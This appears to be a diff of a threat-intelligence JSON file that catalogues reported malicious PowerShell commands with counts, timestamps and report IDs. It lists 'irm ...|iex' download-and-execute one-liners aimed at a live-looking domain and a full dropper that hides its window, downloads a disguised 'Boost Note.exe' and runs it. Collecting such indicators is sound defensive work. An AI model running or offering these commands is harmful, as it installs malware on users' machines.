@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 113,
-    "ReportCount": 113,
-    "FirstSeen": "2026-11-10T23:36:23.677000+00:00",
+    "DistinctPayloadCount": 112,
+    "ReportCount": 112,
+    "FirstSeen": "2026-11-11T00:07:22.150000+00:00",
     "LastSeen": "2026-11-17T21:10:58.737000+00:00",
     "ReportIds": [
-      "cmwbbwwnu04xv0nmldbt2utkz",
       "cmwbd0qn205i20nmle2htabf0",
       "cmwbd1grm05iz0nmlids065kj",
       "cmwbdbmzm05o30nmlvn4xeoc2",
@@ -226,7 +225,6 @@
       "irm 'browse-nnccodes.beer/b442615134ce6b2f'|iex;",
       "irm 'browse-nnccodes.beer/c29bf32503634b69'|iex;",
       "irm 'browse-nnccodes.beer/c5edc53c54b52bdf'|iex;",
-      "irm 'browse-nnccodes.beer/c6faa4c82ba7c265'|iex;",
       "irm 'browse-nnccodes.beer/c7b605b31ca2f950'|iex;",
       "irm 'browse-nnccodes.beer/cd7f076054b8a4ce'|iex;",
       "irm 'browse-nnccodes.beer/cefc867900442c97'|iex;",
@@ -681,13 +679,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 48,
-    "FirstSeen": "2026-11-10T23:40:58.837000+00:00",
+    "ReportCount": 45,
+    "FirstSeen": "2026-11-11T01:31:58.863000+00:00",
     "LastSeen": "2026-11-17T10:13:11.052000+00:00",
     "ReportIds": [
-      "cmwbc2sy1051a0nmlped5obiu",
-      "cmwbcctj1054w0nmldy5ok48q",
-      "cmwbcozau05b40nmlpvqndtvc",
       "cmwbg1jw206qq0nmlz0huek8f",
       "cmwbg2vgl06s20nml1ro6c79z",
       "cmwbg605706uo0nmla9szl8z1",
